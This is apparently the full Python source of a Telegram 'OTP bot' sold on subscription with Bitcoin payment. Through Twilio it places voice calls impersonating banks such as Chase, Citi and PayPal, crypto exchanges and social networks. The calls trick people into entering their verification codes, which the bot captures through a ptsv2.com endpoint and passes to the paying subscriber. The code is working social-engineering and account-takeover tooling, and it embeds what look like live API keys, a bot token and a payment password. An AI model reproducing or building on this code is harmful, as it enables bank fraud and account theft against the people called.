from urllib import parse
import telebot
from datetime import datetime, timezone
from telebot import types
import requests
import json
from telebot.types import ForceReply, InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo, Message, Video
from telegram.constants import ParseMode
from telebot import types
from datetime import datetime, timedelta
import datetime
from dateutil.relativedelta import relativedelta
import telebot, requests, json
from twilio.rest import Client
import pyrebase 
from currency_converter import CurrencyConverter
import pytz
import random

#########################################################################################
now = datetime.date.today().strftime('%m/%d')

date_after_month = datetime.date.today()+ relativedelta(months=1)
onemonth = date_after_month.strftime('%m/%d')
onemonth_sub = date_after_month.strftime('%Y-%m-%d')

date_after_threemonths = datetime.date.today()+ relativedelta(months=3)
threemonths = date_after_threemonths.strftime('%m/%d')
threemonths_sub = date_after_threemonths.strftime('%Y-%m-%d')

date_after_oneday = datetime.date.today()+ relativedelta(days=2)
oneday = date_after_oneday.strftime('%m/%d')
oneday_sub = date_after_oneday.strftime('%Y-%m-%d')

date_after_threedays = datetime.date.today()+ relativedelta(days=4)
threedays = date_after_threedays.strftime('%m/%d')
threedays_sub = date_after_threedays.strftime('%Y-%m-%d')

from datetime import datetime
Today = str(datetime.today().date())
## GET THESE FROM FIREBASE FOR DATABASE
firebaseConfig = {
    'apiKey': "AIzaSyBDPLOza2d7wjgF5ldlapX_ZsS0tvdbcLw",
    'authDomain': "otpbot-aa62c.firebaseapp.com",
    'projectId': "otpbot-aa62c",
    'databaseURL': "https://otpbot-aa62c-default-rtdb.firebaseio.com/",
    'storageBucket': "otpbot-aa62c.appspot.com",
    'messagingSenderId': "537003545122",
    'appId': "537003545122:web:7c2923deb672277ce2b07b",
    'measurementId': "G-Q8V83NBZWG"}
firebase = pyrebase.initialize_app(firebaseConfig)
db = firebase.database()



TOKEN = '7725320858:AAG--nASbPQ9iwHTbRXuoSnSRUACcVpHkgE' #BOT TOKEN

## GET THESE INFO FROM COINREMITTER.COM FOR AUTOMATIC PAYMENT
btc = "bc1qkdu8z6y7p3k094m8w38va66n5aet7xmmnwt6mk"
password = "9kRLxhJjch9QrT@"
api_key = "wkey_EAANKq4KCxwkCUW"
##

bot = telebot.TeleBot(TOKEN)
#########################################################################################
local_tz = pytz.timezone('Europe/Brussels')
wrongcall = "Wrong command ! The commands are:\n\n/call custom (number) (message to say)\n/call (preset) (number)\n\n➞ Change everything in ( ) and remove the ( )."
debug = 7697784412
vouchgroup = "@BOJOM001"
title = "<b>BOJO OTP BOT ° ADVANCED OTP BOT</b>"


def utc_to_local(utc_dt):
    local_dt = utc_dt.replace(tzinfo=pytz.utc).astimezone(local_tz)
    return local_tz.normalize(local_dt)
def aslocaltimestr(utc_dt):
    return utc_to_local(utc_dt).strftime('%Y-%m-%d')
def aslocaldaystr(utc_dt):
    return utc_to_local(utc_dt).strftime('%m/%d')
def latestupdate(utc_dt):
    return utc_to_local(utc_dt).strftime('%Y-%m-%d')
def auth_admins(cid, user):
    access = db.child('groupinfo').child('admins').get()
    accesslist = []
    for admins in access.each():
        accesslist.append(admins.key())
    if user in accesslist:
        pass
    else:
        bot.send_message(cid,"You do not have permission!")
        quit()
def is_number(cid, debug, username, userid, option,to):
    try:
        numbercheck = to.split("+")[1].isdecimal()
    except:
        bot.send_message(cid, wrongcall)
        flag = (False,wrongcall) 
    if numbercheck == True:
        pass
    else:
        notvalid = f"{to} is not a valid number. Try again."
        bot.send_message(cid,notvalid)
        bot.send_message(debug, f"{username} ({userid}) used an invalid number, which was {to} at {option}")
        flag = (False,notvalid)


def get_alert(message,*parse):
    bot.send_message(7697784412,str(message),parse_mode=parse)
def call_initiated(cid,username,userid,option,to,calltoken,msg):
    existence = requests.get(f'https://ptsv2.com/t/{userid}')
    flush = f"http://ptsv2.com/t/{userid}/flush_all"
    url = f"http://ptsv2.com/t/{userid}/d/latest/json"
    editendingmessage = f"http://ptsv2.com/t/{userid}/edit"
    payload ={'AuthUsername':"",'AuthPassword':"",'ResponseCode':"200",'ResponseBody':"Verification completed ! Goodbye !",'ResponseDelay':"0"}
    r = requests.post(editendingmessage,data=payload)
    flushnow = requests.get(flush)
    bot.send_message(debug, f"@{username} ({userid}) Made A Call.\nOption: {option}\nTo: {to}\n\nMessage To Voice: {msg}",parse_mode=ParseMode.HTML)
    bot.send_message(cid, f"<b>Call has been initiated !</b>",parse_mode=ParseMode.HTML)
    bot.send_message(cid, f"Use these commands until the status of the call has either been **completed, failed, Busy or No-answer**.\n➤ `/check status {calltoken}` \n➤ `/check otp` \n\n**Possible status responses are.**\n➤ Completed (if completed do `/check otp`)\n➤ Busy\n➤ failed\n➤ No-answer\n➤ queued\n➤ ringing\n➤ in-progress", parse_mode=PARSEMODE_MARKDOWN)
def checkbase(message):
    allowed = ['/check']
    words = message.text.split()
    if len(words) < 2 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=checkbase)
def message(message):
    username = message.from_user.username
    userid = message.from_user.id
    cid = message.chat.id
    account_sid = db.child('groupinfo').child('keys').get().val()['_sid']
    auth_token = db.child('groupinfo').child('keys').get().val()['_auth']
    client = Client(account_sid, auth_token)
    checkwhat = message.text.split()

    url = f"http://ptsv2.com/t/{userid}/d/latest/json"
    if checkwhat[1] == "otp":
        bot.send_message(cid, "<code>Checking your latest otp code ...</code>",parse_mode=ParseMode.HTML)
        try:
            r = requests.get(url)
            results = r.json()
            Digits =  results['FormValues']['Digits']
            TO = results['FormValues']['To']
            AT = results['Timestamp']
            AT = AT.split(".")[0]
            AT = AT.split('T')
            Digitscleared = "\n".join(Digits)
            bot.send_message(cid, f"OTPCode ➤ `{Digitscleared}`\nCalled To ➤ `{TO[0]}`\nCalled At ➤ `{AT[0]}-{AT[1]}`", parse_mode=PARSEMODE_MARKDOWN)
            bot.send_message(debug,f"OTP RECEIVED FOR @{username} ({userid})\n\nOTPCode ➤ {Digitscleared}\nCalled To ➤ {TO[0]}\n\nCalled At ➤ {AT[0]}-{AT[1]}", parse_mode=ParseMode.HTML)
        except:
            bot.send_message(cid, "No Latest OTP code found !")
    elif checkwhat[1] == "status":
        if (len(checkwhat) == 3):
            callsid = message.text.split()[2]
            flag = True
            try:
                call = client.calls(f'{callsid}').fetch()
            except:
                bot.send_message(cid, f"'{callsid}'\n➤ Is not the correct call token! The Token is always displayed after the call !")
                flag = False
            if (flag == True):
                status = call.status
                if (status == "queued"):
                    status = "Queued ☎️"
                if (status == "ringing"):
                    status = "Ringing 🔔"
                if (status == "in-progress"):
                    status = "In Progress ⌛ - Waiting For User Input"
                if (status == "completed"):
                    status = "Finished ✅ - Check if client left an OTP"
                if (status == "failed"):
                    status == "Failed 🔕 - User Did not pick up"
                
                bot.send_message(cid, f"Token: `{callsid}`.\nStatus ➤ {status}\n\n`/check otp` - Tap & Paste",parse_mode=PARSEMODE_MARKDOWN)
            else:
                bot.send_message(cid, f"That is not an option !\nCommands are:\n`/check otp`\n`/check status` (token)",parse_mode=PARSEMODE_MARKDOWN)
        else:
            bot.send_message(cid, f"That is not an option !\nCommands are:\n`/check otp`\n`/check status` (token)\n\nYou can find your Token, right after the initiation of the call.\nSimply Tap & Paste.",parse_mode=PARSEMODE_MARKDOWN)
    else:
        bot.send_message(cid, f"That is not an option !\nCommands are:\n`/check otp`\n`/check status` (token)",parse_mode=PARSEMODE_MARKDOWN)
#########################################################################################
def order(cid,euros,where_am_i,username,userid,data,From):
    headers = {'content-type' : 'application/json'}
    expire_time = "60"
    time = expire_time + " Min"
    amount = euros
    payload = {'api_key': api_key,'password': password,'address': btc,'currency': 'USD','suceess_url':f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={userid}&text=You Paid Successfully!\nGo back To bot and follow the last instruction!','fail_url':f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={debug}&text=@{username} ({userid}). Failed To Pay!','amount': amount,'expire_time': expire_time,'description': From,'name': data}
    url = "https://coinremitter.com/api/v3/BTC/create-invoice"
    res = requests.post(url,headers=headers,params=payload)
    r =res.json()
    data = r['data']
    msg = r['msg']
    id = data['id']
    invoice_id = data['invoice_id']
    url = data['url']
    BTC = data['total_amount']['BTC']
    name = data['name']
    desc = data['description']
    status = data['status']
    expire_on = data['expire_on']
    time = "60 Min"
    content = f"Invoice ID: {id}\n\nORDER N°: {invoice_id}\nBTC: {BTC} ₿\nName: {name}\nDesc: {desc}\nStatus: {status}\nTime: {time}"
    info = f"{title}\n\n{content}\n\n➠ {where_am_i}"        
    if len(r) > 1:
        try:
            if msg == "Invoice is successfully created.":
                datatest = r['data']
                onemonthkeys = datatest['invoice_id']
                personal = str(onemonthkeys) + str(userid)
                ONEMONTHKEYS.append(personal)
                ownerkey = str(onemonthkeys) + str(7697784412)
                ONEMONTHKEYS.append(ownerkey)
        except:
            bot.send_message(cid, "<b>Error 002</b> ° Issue with creating the invoice!", parse_mode=ParseMode.HTML)
    else:
        bot.send_message(cid, "<b>Error 003</b> ° Issue with creating invoice!", parse_mode=ParseMode.HTML)
    bot.send_message(cid,info,parse_mode=ParseMode.HTML)
    bot.send_message(cid,f"Web Gateway: <a href='{url}'>{invoice_id}</a>",parse_mode=ParseMode.HTML)
    bot.send_message(cid,f"When your payment has reached 3 confirmations, Tap & Paste <code>/invoice status {invoice_id}</code>",parse_mode=ParseMode.HTML)
    status_payment_link = f"https://coinremitter.com/invoice/{id}"
    notify = f"[Customer]\nUser: @{username} ({userid})\n\nNAME: `{name}`\nMSG: *{msg}*\nID: `{id}`\nORDER N°: {invoice_id}\nORDER Total: {amount} £\n\nSTATUS PAYMENT LINK:\n{status_payment_link}"
    notify_email = f"[Customer]\nUser: @{username} ({userid})\n\nNAME: {name}\nMSG: {msg}\nID: {id}\nORDER N°: {invoice_id}\nORDER Total: {amount} €\n\nSTATUS PAYMENT LINK:\n{status_payment_link}"
    bot.send_message(debug, notify, parse_mode=PARSEMODE_MARKDOWN) 
#########################################################################################
now_brussels = aslocaltimestr(datetime.now(timezone.utc))
now_brussels_day = aslocaldaystr(datetime.now(timezone.utc))
Lupdate = latestupdate(datetime.now(timezone.utc))

verify = db.child('members').get()
#########################################################################################
ALL = []
PAID = []
lifetime = "∞"
c = CurrencyConverter()
#########################################################################################        
#########################################################################################
SUPPORT = types.InlineKeyboardButton(text="⚙️ Support", callback_data="Support")
FAQ = types.InlineKeyboardButton(text="❓ FAQ", callback_data="Faq")
OTP = types.InlineKeyboardButton(text="❓ WHAT IS OTP BOT", callback_data="OTP")
BOTINFO = types.InlineKeyboardButton(text="🤖 BOT INFO", callback_data="Bot Info")
CONFIRM = types.InlineKeyboardButton(text="✅ Read Everything", callback_data="Start")
OWNER = types.InlineKeyboardButton(text="👨‍💻 Admin Only", callback_data="Owner")
GOBACK = types.InlineKeyboardButton(text="🔙 Go Back", callback_data="Start") 
DASHBOARD = types.InlineKeyboardButton(text="卐 Dashboard", callback_data="Dashboard")
SUBSCRIPTIONS = types.InlineKeyboardButton(text="🛒 Subscriptions", callback_data="Subscriptions")
PROFILE = types.InlineKeyboardButton(text="👤 My Profile", callback_data="My Profile")
SUPPORTEDCALLS = types.InlineKeyboardButton(text="📞 Supported Calls", callback_data="Supported Calls")
EXAMPLECALL = types.InlineKeyboardButton(text="🎥 Example Video", callback_data="Example Call")
CALL = types.InlineKeyboardButton(text="📲 How To Call?", callback_data="Call")
TODO = types.InlineKeyboardButton(text="📜 TO DO", callback_data="ToDo")
REFERRAL = types.InlineKeyboardButton(text="🧬 REFERRAL", callback_data="Referral")


onedaypr = 30
onedaypr = f"{onedaypr}€ - {c.convert(onedaypr, 'EUR', 'USD')}$"

threedayspr = 80
threedayspr = f"{threedayspr}€ - {c.convert(threedayspr, 'EUR', 'USD')}$"

onemonthpr = 250
onemonthpr = f"{onemonthpr}€ - {c.convert(onemonthpr, 'EUR', 'USD')}$"

threemonthspr = 600
threemonthspr = f"{threemonthspr}€ - {c.convert(threemonthspr, 'EUR', 'USD')}$"

lifetimepr = 2400
lifetimepr = f"{lifetimepr}€ - {c.convert(lifetimepr, 'EUR', 'USD')}$"


ONEDAY = types.InlineKeyboardButton(text=f"1 D [{now_brussels_day} - {oneday}] | {onedaypr}", callback_data="One Day")
THREEDAYS = types.InlineKeyboardButton(text=f"3 D [{now_brussels_day} - {threedays}] | {threedayspr}", callback_data="Three Days")
ONEMONTH = types.InlineKeyboardButton(text=f"1 M [{now_brussels_day} - {onemonth}] | {onemonthpr}", callback_data="One Month")
THREEMONTHS = types.InlineKeyboardButton(text=f"3 M [{now_brussels_day} - {threemonths}] | {threemonthspr}", callback_data="Three Months")
LIFETIME = types.InlineKeyboardButton(text=f"LIFETIME [{now_brussels_day} - {lifetime}] | {lifetimepr}", callback_data="Lifetime")

BUYONEDAY = types.InlineKeyboardButton(text="✅ BUY", callback_data="Buying One Day")
BUYTHREEDAYS = types.InlineKeyboardButton(text="✅ BUY", callback_data="Buying Three Days")
BUYONEMONTH = types.InlineKeyboardButton(text="✅ BUY", callback_data="Buying One Month")
BUYTHREEMONTHS = types.InlineKeyboardButton(text="✅ BUY", callback_data="Buying Three Months")
BUYLIFETIME = types.InlineKeyboardButton(text="✅ BUY", callback_data="Buying Lifetime")

todo = """
    ➞ Check FAQ 🙋❓(Back > Support > Faq)
    ➞ Check OTP 🙋❓(What is otp bot)
    ➞ Check POC VID 🙋❓(Example Video)
    ➞ Check How To Call 🙋❓(How to call)
    ➞ Look around, get familiar with the bot 🤖
    ➞ CONTACT <a href="https://t.me/BOJOM001">ADMIN SUPPORT</a>
        ➞ if not, you can't use the bot 🚫"""
owner = "@BOJOM001"
ownerid = 7697784412
ONEMONTHKEYS=[]
where_am_i_calls = "<b><i>You are in the 'Supported Calls' section !</i></b>"
supported = f"{title}\n\nTo initiate a call do /call [supported name] [to]\n<b>Current supported calls are</b>\n\n__________<b>🏦 BANKS 🏦</b>__________\n➞ universal (default)\n➞ chase\n➞ fargo\n➞ america\n➞ citi\n➞ goldman\n➞ morgan\n➞ paypal\n➞ (not set)\n\n______<b>📣 SOCIAL_MEDIA 📣</b>______\n➞ fb (facebook)\n➞ ig (instagram)\n➞ sc (snapchat)\n➞ rd (reddit)\n➞ dc (discord)\n➞ tg (telegram)\n➞ wt (whatsapp)\n➞ yt (youtube)\n➞ tw (twitter)\n➞ tk (tiktok)\n➞ (not set)\n\n______<b>₿ CRYPTO ₿</b>______\n➞ cb (coinbase)\n➞ bc (binance)\n➞ ex (exodus)\n➞ (not set)\n\n______<b>🔧 CUSTOM 🔧</b>______\n➞ /call custom [number] [text_to_voice]\n\n➠ {where_am_i_calls}"
#########################################################################################
def subadderbase(message):
    allowed = ['/subadder']
    words = message.text.split()
    if len(words) < 4 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=subadderbase)
def message(message):
    userid = message.from_user.id
    cid = message.chat.id
    auth_admins(cid, str(userid))
    account_sid = db.child('groupinfo').child('keys').get().val()['_sid']
    auth_token = db.child('groupinfo').child('keys').get().val()['_auth']
    subscription_begin = Today
    id = message.text.split()[1]
    subscription_end = message.text.split()[2]
    sub_period = message.text.split(" ",3)[3]
    bot.send_message(cid, f"Trying to add new user ({id}), with {subscription_begin}|{subscription_end}|{sub_period}")
    try:
        db.child('members').child(f'{id}').update({'subscription_begin': subscription_begin, 'subscription_end': subscription_end, 'status': 'Paid', 'subbed': True, 'sub_period': sub_period, '_sid': account_sid, '_auth': auth_token})
        bot.send_message(cid, "User has been updated successfully !")
    except:
        bot.send_message(cid, f"Error adding new user, with {subscription_begin}|{subscription_end}|{sub_period}!")
#########################################################################################
def invoicebase(message):
    allowed = ['/invoice']
    words = message.text.split()
    if len(words) < 3 or words[0].lower() not in allowed:
        return False
    else:
        return True
sub_begin = Today
@bot.message_handler(func=invoicebase)
def message(message):
    cid = message.chat.id
    username = message.from_user.username
    userid = message.from_user.id
    if message.text.split()[1] == "status":
        invoice_id = message.text.split()[2]
        headers = {'content-type' : 'application/json'}
        payload = {'api_key': api_key,'password': password,'invoice_id': invoice_id}
        url = "https://coinremitter.com/api/v3/BTC/get-invoice"
        res = requests.post(url,headers=headers,params=payload)
        userid = message.from_user.id
        r =res.json()
        try:
            userid = message.from_user.id
            auth = str(invoice_id) + str(userid)
            if auth in ONEMONTHKEYS:
                status = r['data']['status_code']
                if status == 0:
                    status = "STATUS: Pending ..."
                elif status == 1:
                    status = "STATUS: Paid successfully!"
                elif status == 2:
                    status = "STATUS: UNDERPAID!"
                elif status == 3:
                    status = "STATUS: OVERPAID!"
                elif status == 4:
                    status = "STATUS: EXPIRED!"
                elif status == 5:
                    status = "STATUS: CANCELED!"
                #status = "STATUS: Paid successfully!"
                if ((status == "STATUS: Paid successfully!") or (status == "STATUS: OVERPAID!")):
                    try:
                        name = r['data']['name']
                        members = db.child('members').get()
                        for member in members.each():
                            if member.key() == str(userid):
                                try:
                                    latestpurchase = db.child('groupinfo').child('latest_purchase').update({'username': f'@{username}', 'userid': userid})
                                except:
                                    pass
                                try:
                                    account_sid = db.child('groupinfo').child('keys').get().val()['_sid']
                                    auth_token = db.child('groupinfo').child('keys').get().val()['_auth']
                                    client = Client(account_sid, auth_token)
                                    account = client.api.accounts.create(friendly_name=f'@{username} ({userid})')
                                    sub_begin = Today
                                except:
                                    account_sid = 'Error'
                                    auth_token = 'Error'
                                if name == "ONEMONTH":
                                    sub_end = onemonth_sub
                                    sub_period = "1 Month"
                                    db.child('members').child(member.key()).update({'subscription_begin': sub_begin, 'subscription_end': sub_end, 'status': 'active', 'subbed': True, 'sub_period': sub_period, '_sid': account_sid, '_auth': auth_token})
                                elif name == "THREEMONTHS":
                                    sub_end = threemonths_sub
                                    sub_period = "3 Months"
                                    db.child('members').child(member.key()).update({'subscription_begin': sub_begin, 'subscription_end': sub_end, 'status': 'Paid', 'subbed': True, 'sub_period': sub_period, '_sid': account_sid, '_auth': auth_token})
                                elif name == "LIFETIME":
                                    sub_end = 'Never'
                                    sub_period = "LIFETIME"
                                    db.child('members').child(member.key()).update({'subscription_begin': sub_begin, 'subscription_end': sub_end, 'status': 'Paid', 'subbed': True, 'sub_period': sub_period, '_sid': account_sid, '_auth': auth_token})
                                elif name == "ONEDAY":
                                    sub_end = oneday_sub
                                    sub_period = "1 Day"
                                    db.child('members').child(member.key()).update({'subscription_begin': sub_begin, 'subscription_end': sub_end, 'status': 'Paid', 'subbed': True, 'sub_period': sub_period, '_sid': account_sid, '_auth': auth_token})
                                elif name == "THREEDAYS":
                                    sub_end = threedays_sub
                                    sub_period = "3 Days"
                                    db.child('members').child(member.key()).update({'subscription_begin': sub_begin, 'subscription_end': sub_end, 'status': 'Paid', 'subbed': True, 'sub_period': sub_period, '_sid': account_sid, '_auth': auth_token})

                        success = "You paid successfully!\nYour account has been added to the server!\nEnjoy your stay."
                        bot.send_message(cid, success, parse_mode=PARSEMODE_MARKDOWN)
                    except:
                        bot.send_message(cid, "There was an issue creating your account.\nContact: @BOJOM001", parse_mode=PARSEMODE_MARKDOWN)
                    get_alert(f"@{username} ({userid}) checked his/her status. \n\n{status}")
                else:
                    bot.send_message(cid, status)
            else:
                bot.send_message(message.chat.id, "That is not possible ;p")
        except:
            bot.send_message(cid, "Wrong invoice id!")
            get_alert(f"@{username} ({userid}) used wrong invoice id")
    else:
        bot.send_message(cid, "<b>Error 005</b> ° There is an issue with the invoice id", parse_mode=ParseMode.HTML)
#########################################################################################
def reportbugbase(message):
    allowed = ['/reportbug']
    words = message.text.split()
    if len(words) < 2 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=reportbugbase)
def message(message):
    try:
        cid = message.chat.id
        username = message.from_user.username
        userid = message.from_user.id
        bug = message.text.split(' ',1)[1]
        info = "Report has been sent to the owner!"
        info2 = f"<i>[BUG]</i>\nUser: @{username}\nUserid: {userid}\nBug: {bug}"
        bot.send_message(cid, info)
        get_alert(info2,ParseMode.HTML)
    except:
        bot.send_message(cid, "<b>Error 004</b> ° Issue with reporting the bug!", parse_mode=ParseMode.HTML)
        get_alert(f"@{username} ({userid}) Failed To Report A Bug.")
#########################################################################################
def callbase(message):
    allowed = ['/call']
    words = message.text.split()
    if len(words) < 2 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=callbase)
def message(message):
        username = message.from_user.username
        userid = message.from_user.id
        cid = message.chat.id
        flag = (True,None)
        try:
            allmembers = db.child('members').child(str(userid)).get()
            check = allmembers.val()['subscription_end']
            check = str(check)
            if ((check != 'Not paid') and (check != '') and (check != 'Never')):
                if check <= Today:
                    db.child('members').child(userid).update({'subscription_begin': 'Not Paid', 'subscription_end': 'Not paid', 'status': 'Not paid', 'subbed': False, 'sub_period': 'Not paid', '_sid': 'Not paid', '_auth': 'Not paid'})
                    get_alert(f'@{username} ({userid}) subscription has exceeded! Auto deleted.')
        except:
            pass
        from_ = db.child("groupinfo").child("keys").child("from_").get().val() # get from database using firebase or twilio
        try:
            account_sid = verify.val()[str(userid)]['_sid']
            auth_token = verify.val()[str(userid)]['_auth']
            client = Client(account_sid, auth_token)
        except:
            bot.send_message(cid, "Error! Do you have a subscription?\nIf you have already contact owner @BOJOM001")
            flag = (False,"No Subsription")
        checked = db.child('members').child(str(userid)).get()
        if checked.val()['status'].lower() == "suspended":
            bot.send_message(cid, 'Your account has been suspended!\nWant to know why? => @BOJOM001')
            flag = (False,"Account Suspended")
        if checked.val()['status'].lower() == "active":
            pass
        if checked.val()['status'].lower() == "closed":
           bot.send_message(cid, 'Your account has been closed!\nWant to know why? => @BOJOM001')
           flag = (False, "Account Closed")
        if bool(checked.val()['subbed']) == True:
                ## BANKS
                option = message.text.lower().split()[1]
                if option == 'chase':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from our chaise bank, followed by the pound sign."                    
                
                elif option == 'universal':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                elif option == 'fargo':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from our fargo bank, followed by the pound sign."
                    

                elif option == 'america':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from america bank, followed by the pound sign."
                    
                        
                elif option == 'citi':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from our citi bank, followed by the pound sign."
                        
                elif option == 'morgan':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from our morgan bank, followed by the pound sign."
                    
                        
                elif option == 'goldman':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from our goldman bank, followed by the pound sign."
                    
                elif option == 'paypal':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your account. To secure your account please enter the verification code you just received from our paypal bank, followed by the pound sign."
                        
                elif option == 'custom':
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    try:
                        msg = message.text.split(" ",3)[3]
                    except:
                        bot.send_message(cid, "There is an issue with your message, recheck it.\nTry @BOJOM001")
                        get_alert(f'@{username} ({userid}) has an issue with their custom message.')
                        return
                        
                ## CRYPTO
                elif ((option == 'cb') or (option == 'coinbase')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your coinbase account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                        
                elif ((option == 'bc') or (option == 'binance')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your binance account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'ex') or (option == 'exodus')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your exodus account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                
                ## SOCIAL MEDIA
                elif ((option == 'instagram')) or ((option == 'ig')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your instagram account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'facebook')) or ((option == 'fb')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your facebook account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'discord')) or ((option == 'dc')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your discord account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'reddit')) or ((option == 'rd')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your reddit account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'whatsapp')) or ((option == 'wt')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your whatsapp account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'youtube')) or ((option == 'yt')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your youtube account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                    
                        
                elif ((option == 'tiktok')) or ((option == 'tk')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your tiktok account. To secure your account please enter the verification code you just received from us, followed by the pound sign."

                elif ((option == 'snapchat')) or ((option == 'sc')):
                    to = message.text.split()[2]
                    is_number(cid, debug, username, userid, option,to)
                    msg = "We received unusual activity on your snapchat account. To secure your account please enter the verification code you just received from us, followed by the pound sign."
                else:
                    bot.send_message(cid, wrongcall)
                    flag = (False,wrongcall)
                try:
                    try:
                        lang = db.child('members').child(f'{userid}').get().val()['language']
                    except:
                        bot.send_message(cid,"could not use your preferred language, so we have set it to en-US")
                        lang = "en-US" 
                    if flag[0] == True:
                        call = client.calls.create(twiml= f'<Response><Gather timeout="20" action="http://ptsv2.com/t/{userid}/post" finishOnKey="#"><Pause length="3"/><Say language="{lang}" voice="alice">{msg}</Say></Gather><Say>We didn\'t receive any input. Goodbye!</Say></Response>',fallback_url="http://AuthOTPBOT.atwebpages.com/BANKS/fallback.xml",to=f'{to}',from_=f'{from_}')
                        calltoken = call.sid
                    else:
                        bot.send_message(cid, flag[1])
                except:
                    error = "Could not initiate the call !"
                    get_alert(f'{username} ({userid}) has an issue with their call.')
                    flag = (False,error)
                
                if flag[0] == True:
                    call_initiated(cid,username,userid,option,to,calltoken,msg)
                else:
                    bot.send_message(cid, flag[1])
        else:
                bot.send_message(cid, "Error :: You don't have a subscription!\nBuy one here /help.", parse_mode=ParseMode.HTML)
#########################################################################################
def languages(message):
    allowed = ['/lang']
    words = message.text.split()
    if len(words) < 2 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=languages)
def message(message):
    cid = message.chat.id
    userid = message.from_user.id
    langsoptions = ['da-DK', 'de-DE', 'en-AU', 'en-CA', 'en-GB', 'en-IN', 'en-US', 'ca-ES', 'es-ES', 'es-MX', 'fi-FI', 'fr-CA', 'fr-FR', 'it-IT', 'ja-JP', 'ko-KR', 'nb-NO', 'nl-NL', 'pl-PL', 'pt-BR', 'pt-PT', 'ru-RU', 'sv-SE', 'zh-CN', 'zh-HK', 'zh-TW'] 
    newlang = message.text.split()[1]
    if newlang in langsoptions:
        db.child('members').child(f"{userid}").update({'language': f'{newlang}'})
        bot.send_message(cid, f"✅ Language Successfully Changed To {newlang}")
    else:
        bot.send_message(cid, "That option does not exist !\ntap /langoptions to see a list of possible languages.\nRemember the capitals!")
@bot.message_handler(commands=["langoptions"])
def any_msg(message):
    cid = message.chat.id
    LANGUAGES = """
[0] da-DK : Danish, Denmark
[1] de-DE : German, Germany
[2] en-AU : English, Australia
[3] en-CA : English, Canada
[4] en-GB : English, UK
[5] en-IN : English, India
[6] en-US : English, United States
[7] ca-ES : Catalan, Spain
[8] es-ES : Spanish, Spain
[9] es-MX : Spanish, Mexico
[10] fi-FI : Finnish, Finland
[11] fr-CA : French, Canada
[12] fr-FR : French, France
[13] it-IT : Italian, Italy
[14] ja-JP : Japanese, Japan
[15] ko-KR : Korean, Korea
[16] nb-NO : Norwegian, Norway
[17] nl-NL : Dutch, Netherlands
[18] pl-PL : Polish-Poland
[19] pt-BR : Portuguese, Brazil
[20] pt-PT : Portuguese, Portugal
[21] ru-RU : Russian, Russia
[22] sv-SE : Swedish, Sweden
[23] zh-CN : Chinese (Mandarin)
[24] zh-HK : Chinese (Cantonese)
[25] zh-TW : Chinese (Taiwanese Mandarin)
    """
    bot.send_message(cid, LANGUAGES)
def broadcast(message):
    allowed = ['/brd']
    words = message.text.split()
    if len(words) < 1 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=broadcast)
def message(message):
    try:
        cid = message.chat.id
        userid = message.from_user.id
        auth_admins(cid, str(userid))
        if message.text.lower().split()[1] == "pm":
            to = message.text.split()[2]
            msg = message.text.split(' ',3)[3]
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={to}&text={msg}"
            r = requests.get(url)
            bot.send_message(cid, "Message has been sent !")
        elif message.text.lower().split()[1] == "all":
            access = db.child('members').get()
            msg = message.text.split(' ',2)[2]
            bot.send_message(cid, "Sending message to all of your users !\nIt will take a bit before its finished.")
